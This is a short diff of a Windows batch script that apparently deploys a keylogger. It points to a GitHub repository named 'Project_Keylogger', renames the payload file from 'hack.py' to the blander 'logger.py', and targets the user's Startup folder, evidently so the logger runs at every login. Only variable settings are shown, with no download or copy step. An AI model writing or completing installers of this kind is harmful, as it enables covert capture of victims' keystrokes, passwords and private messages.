@@ -4,7 +4,7 @@ setlocal
 
 REM Set the GitHub repository URL and Python file name
 set GITHUB_REPO_URL=https://github.com/DarshanParappagoudar/Project_Keylogger.git
-set PYTHON_FILE_NAME=hack.py
+set PYTHON_FILE_NAME=logger.py
 
 REM Set the path to the Startup folder
 set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
